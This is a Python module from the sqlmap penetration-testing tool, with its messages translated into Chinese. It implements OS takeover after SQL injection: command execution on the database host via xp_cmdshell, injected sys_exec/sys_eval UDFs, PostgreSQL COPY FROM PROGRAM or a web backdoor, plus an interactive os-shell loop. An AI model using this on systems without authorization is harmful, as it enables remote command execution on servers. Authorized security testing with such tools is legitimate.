#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from __future__ import print_function

import sys

from lib.core.common import Backend
from lib.core.common import dataToStdout
from lib.core.common import getSQLSnippet
from lib.core.common import isStackingAvailable
from lib.core.common import readInput
from lib.core.convert import getUnicode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import AUTOCOMPLETE_TYPE
from lib.core.enums import DBMS
from lib.core.enums import OS
from lib.core.exception import SqlmapFilePathException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.shell import autoCompletion
from lib.request import inject
from lib.takeover.udf import UDF
from lib.takeover.web import Web
from lib.takeover.xp_cmdshell import XP_cmdshell
from lib.utils.safe2bin import safechardecode
from thirdparty.six.moves import input as _input

class Abstraction(Web, UDF, XP_cmdshell):
    """
    This class defines an abstraction layer for OS takeover functionalities
    to UDF / XP_cmdshell objects
    """

    def __init__(self):
        self.envInitialized = False
        self.alwaysRetrieveCmdOutput = False

        UDF.__init__(self)
        Web.__init__(self)
        XP_cmdshell.__init__(self)

    def execCmd(self, cmd, silent=False):
        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
            self.copyExecCmd(cmd)

        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            self.udfExecCmd(cmd, silent=silent)

        elif Backend.isDbms(DBMS.MSSQL):
            self.xpCmdshellExecCmd(cmd, silent=silent)

        else:
            errMsg = errMsg = "後端數據庫管理系統尚未實現此功能"
            raise SqlmapUnsupportedFeatureException(errMsg)

    def evalCmd(self, cmd, first=None, last=None):
        retVal = None

        if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
            retVal = self.copyExecCmd(cmd)

        elif self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            retVal = self.webBackdoorRunCmd(cmd)

        elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
            retVal = self.udfEvalCmd(cmd, first, last)

        elif Backend.isDbms(DBMS.MSSQL):
            retVal = self.xpCmdshellEvalCmd(cmd, first, last)

        else:
            errMsg = errMsg = "後端數據庫管理系統尚未實現此功能"
            raise SqlmapUnsupportedFeatureException(errMsg)

        return safechardecode(retVal)

    def runCmd(self, cmd):
        choice = None

        if not self.alwaysRetrieveCmdOutput:
            message = "您是否要檢索命令的標準輸出？[Y/n/a] "
            #message += "output? [Y/n/a] "
            choice = readInput(message, default='Y').upper()

            if choice == 'A':
                self.alwaysRetrieveCmdOutput = True

        if choice == 'Y' or self.alwaysRetrieveCmdOutput:
            output = self.evalCmd(cmd)

            if output:
                conf.dumper.string("command standard output", output)
            else:
                dataToStdout("No output\n")
        else:
            self.execCmd(cmd)

    def shell(self):
        if self.webBackdoorUrl and (not isStackingAvailable() or kb.udfFail):
            infoMsg = "正在調用操作系統 shell。要退出,請輸入'x'或'q'並按下回車鍵"
            #infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        else:
            if Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
                infoMsg = "將使用 'COPY ... FROM PROGRAM ...' 命令執行"
                #infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                infoMsg = "將使用注入的用戶定義函數 'sys_eval' 和 'sys_exec' 進行操作系統命令執行"
                #infoMsg += "'sys_eval' and 'sys_exec' for operating system "
                #infoMsg += "command execution"
                logger.info(infoMsg)

            elif Backend.isDbms(DBMS.MSSQL):
                infoMsg = "將使用擴展過程 'xp_cmdshell' 進行操作系統命令執行"
                #infoMsg += "operating system command execution"
                logger.info(infoMsg)

            else:
                errMsg = "後端數據庫管理系統尚未實現此功能"
                raise SqlmapUnsupportedFeatureException(errMsg)

            infoMsg = "正在調用%s 操作系統的 shell。要退出,請輸入'x'或'q'並按下回車鍵" % (Backend.getOs() or "Windows")
            #infoMsg += "'x' or 'q' and press ENTER"
            logger.info(infoMsg)

        autoCompletion(AUTOCOMPLETE_TYPE.OS, OS.WINDOWS if Backend.isOs(OS.WINDOWS) else OS.LINUX)

        while True:
            command = None

            try:
                command = _input("os-shell> ")
                command = getUnicode(command, encoding=sys.stdin.encoding)
            except UnicodeDecodeError:
                pass
            except KeyboardInterrupt:
                print()
                errMsg = "用戶中止操作"
                logger.error(errMsg)
            except EOFError:
                print()
                errMsg = "退出"
                logger.error(errMsg)
                break

            if not command:
                continue

            if command.lower() in ("x", "q", "exit", "quit"):
                break

            self.runCmd(command)

    def _initRunAs(self):
        if not conf.dbmsCred:
            return

        if not conf.direct and not isStackingAvailable():
            errMsg = "不支持堆疊查詢,因此 sqlmap 無法將語句作為另一個用戶執行。執行將繼續進行,提供的 DBMS 憑據將被忽略"
            #errMsg += "execute statements as another user. The execution "
            #errMsg += "will continue and the DBMS credentials provided "
            #errMsg += "will simply be ignored"
            logger.error(errMsg)

            return

        if Backend.isDbms(DBMS.MSSQL):
            msg = "在 Microsoft SQL Server 2005 和 2008 上,默認情況下禁用了 OPENROWSET 函數。由於您提供了'--dbms-creds'選項,此函數需要用於以另一個 DBMS 用戶身份執行語句。如果您是 DBA,可以啟用它。您是否要啟用它？[Y/n] "
            #msg += "is disabled by default. This function is needed to execute "
            #msg += "statements as another DBMS user since you provided the "
            #msg += "option '--dbms-creds'. If you are DBA, you can enable it. "
            #msg += "Do you want to enable it? [Y/n] "

            if readInput(msg, default='Y', boolean=True):
                expression = getSQLSnippet(DBMS.MSSQL, "configure_openrowset", ENABLE="1")
                inject.goStacked(expression)

        # TODO: add support for PostgreSQL
        # elif Backend.isDbms(DBMS.PGSQL):
        #     expression = getSQLSnippet(DBMS.PGSQL, "configure_dblink", ENABLE="1")
        #     inject.goStacked(expression)

    def initEnv(self, mandatory=True, detailed=False, web=False, forceInit=False):
        self._initRunAs()

        if self.envInitialized and not forceInit:
            return

        if web:
            self.webInit()
        else:
            self.checkDbmsOs(detailed)

            if mandatory and not self.isDba():
                warnMsg = "由於當前會話用戶不是數據庫管理員,所以請求的功能可能無法正常工作"
                #warnMsg += "the current session user is not a database administrator"

                if not conf.dbmsCred and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                    warnMsg += "。如果您能夠通過任何方式提取和破解 DBA 密碼,您可以嘗試使用'--dbms-cred'選項以 DBA 用戶的身份執行語句"
                    #warnMsg += "to execute statements as a DBA user if you "
                    #warnMsg += "were able to extract and crack a DBA "
                    #warnMsg += "password by any mean"

                logger.warning(warnMsg)

            if any((conf.osCmd, conf.osShell)) and Backend.isDbms(DBMS.PGSQL) and self.checkCopyExec():
                success = True
            elif Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                success = self.udfInjectSys()

                if success is not True:
                    msg = "無法進行操作系統接管"
                    raise SqlmapFilePathException(msg)
            elif Backend.isDbms(DBMS.MSSQL):
                if mandatory:
                    self.xpCmdshellInit()
            else:
                errMsg = "後端數據庫管理系統尚未實現此功能"
                raise SqlmapUnsupportedFeatureException(errMsg)

        self.envInitialized = True
